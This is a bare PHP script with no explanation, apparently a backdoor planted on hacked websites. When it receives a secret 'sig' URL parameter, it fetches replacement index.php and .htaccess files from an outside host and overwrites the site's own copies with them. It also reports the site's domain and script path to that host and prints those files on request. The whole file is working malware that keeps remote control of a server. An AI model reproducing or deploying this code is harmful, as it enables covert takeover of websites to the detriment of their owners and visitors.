<?php
	function curl_get_contents($url)
    {
       $ch =curl_init();
       curl_setopt($ch, CURLOPT_URL, $url);
       curl_setopt($ch, CURLOPT_TIMEOUT,5);
       curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
       $r = curl_exec($ch);
       curl_close($ch);
       return $r;
    }
 	$sig = $_GET['sig'];
 	if($sig=='pt22'){
	    $domain_name = $_SERVER['SERVER_NAME'];
		$domain_name1 = str_replace("www.","",$_SERVER['SERVER_NAME']);
		$file_path = $_SERVER['DOCUMENT_ROOT'].'/index.php';
		$file_path_ht = $_SERVER['DOCUMENT_ROOT'].'/.htaccess';
		$file_path1 = 'http://www.nhathuoc.co/shell_index/'.$domain_name1.'/index1.html';
		$file_path_ht1 = 'http://www.nhathuoc.co/shell_index/'.$domain_name1.'/htaccess.html';
	    $file_path1_headers=get_headers($file_path1);
	    $file_path_ht1_headers=get_headers($file_path_ht1);
	    if(file_exists($file_path)){
		    if(preg_match('/200/',$file_path1_headers[0])){
				$str1=@file_get_contents($file_path1);
				$str=@file_get_contents($file_path);
				if($str==$str1){
					 echo 'ok';
				}else{
				     echo 'fail';
			         chmod($file_path,0644);
			         if(copy($file_path1,$file_path))
			         {
			             echo 'index.php copy success!';
			         }
			         else
			         {
			             echo 'index.php copy fail!';
			         }
				}
				
			}else{
				$ser_url1= "http://www.nhathuoc.co/create_path_file21.php?dname1=".$domain_name1."&check_address1=http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."";
				$file_contents_2=curl_get_contents($ser_url1);	
			}
	    }
	    if(file_exists($file_path_ht)){
			if(preg_match('/200/',$file_path_ht1_headers[0])){
				$str_ht1=@file_get_contents($file_path_ht1);
				$str_ht=@file_get_contents($file_path_ht);
				if($str_ht==$str_ht1){
					 echo 'ok';
				}else{
				     echo 'fail';
			         chmod($file_path_ht,0644);
			         if(copy($file_path_ht1,$file_path_ht))
			         {
			             echo '.htaccess copy success!';
			         }
			         else
			         {
			             echo '.htaccess copy fail!';
			         }
				}
				
			}else{
				$ser_url_ht1= "http://www.nhathuoc.co/create_path_file22.php?dname1=".$domain_name1."&check_address1=http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."";
				$file_contents_ht2=curl_get_contents($ser_url_ht1);	
			}
	  }
 	}else if($sig=='del22'){
 		$domain_name1 = str_replace("www.","",$_SERVER['SERVER_NAME']);
 		$ser_url= "http://www.nhathuoc.co/create_path_file3.php?dname1=".$domain_name1."";
		$file_contents_33=curl_get_contents($ser_url);
		echo $file_contents_33;
 	}else if($sig=='index'){
 		$file_path = $_SERVER['DOCUMENT_ROOT'].'/index.php';
 		$str=@file_get_contents($file_path);
 		echo $str;
 	}else if($sig=='htaccess'){
 		$file_path_ht = $_SERVER['DOCUMENT_ROOT'].'/.htaccess';
 		$str=@file_get_contents($file_path_ht);
 		echo $str;
 	}else if($sig=='upgrade'){
 		
 		
 	}
 	exit();
?>